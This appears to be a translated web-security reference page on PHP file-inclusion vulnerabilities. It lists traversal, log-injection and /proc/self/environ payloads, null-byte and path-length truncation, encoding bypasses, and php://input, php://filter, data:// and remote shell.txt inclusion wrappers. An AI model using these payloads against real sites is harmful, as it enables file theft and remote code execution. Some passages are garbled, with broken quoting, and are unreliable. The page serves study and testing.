File contains
========================================

Base
----------------------------------------
Common file contains vulnerabilities in the form of ``<?php include("inc/" . $_GET['file']); ?>``

Consider several commonly used methods of inclusion

- The same directory contains ``file=.htaccess``
- Directory traversal ``?file=../../../../../../../../var/lib/locate.db``
- Log injection ``?file=../../../../../../../../var/log/apache/error.log``
-Use ``/proc/self/environ``

The log can be tested using SSH logs or web logs.

Trigger Sink
----------------------------------------
- PHP
- include
- An error occurs during the inclusion process and will not affect the execution of subsequent statements
- include_once
- Only once included
- require
- If an error occurs during the inclusion process, it will exit directly and no subsequent statements will be executed
- require_once


Bypassing Tips
----------------------------------------
Common applications may call functions to judge the file before it is included. Generally, there are several ways to bypass it.

Url encoding bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
If the string matches in WAF, you can use url multiple encodings to bypass it

Special character bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- In some cases, reading files supports the use of Shell wildcards, such as ``?`````*`, etc.
- Using ``?``````` in url may affect the results included
- In some cases, characters with different encodings but similar glyphs have the same effect

%00 cutoff
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Almost the most commonly used method, provided that ``magic_quotes_gpc`` is closed and the php version is less than 5.3.4.

Length cutoff
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The length of the file name on Windows is related to the file path. The specific relationship is: from the root directory, the file path length is up to 259 bytes.

msdn definition ``#define MAX_PATH 260``, where the 260th character is the end of the string `` `` , while Linux can use getconf to determine file name length limit and file path length limit.

Get the longest file path length: getconf PATH_MAX /root Get 4096
Get the longest file name: getconf NAME_MAX /root Get 255

Then when the length is limited, the path can be exploded through this form of ``././././`.

In the php code inclusion, this bypass method requires the php version < php 5.2.8

Pseudo-Protocol Bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Remote contains: Requires ``allow_url_fopen=On`` and ``allow_url_include=On``, and payload is ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt`` form
- PHP input: Put the payload in the POST parameter as the included file, requiring ``allow_url_include=On``, and the payload is in the form of ``?file=php://input``
- Base64: Use Base64 pseudo-protocol to read files, payload is in the form of ``?file=php://filter/convert.base64-encode/resource=index.php``
- data: Use the data pseudo-protocol to read the file, payload is in the form of ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=``, requiring ``allow_url_include=On``

Protocol bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``allow_url_fopen`` and ``allow_url_include`` mainly work for the ``http`` ``ftp`` two protocols, so SMB, WebDav protocols, etc. can be used to bypass restrictions.

Reference link
----------------------------------------
- `Exploit with PHP Protocols <https://www.cdxy.me/?p=752>`_
- `lfi cheat sheet <https://highon.coffee/blog/lfi-cheat-sheet/>`_
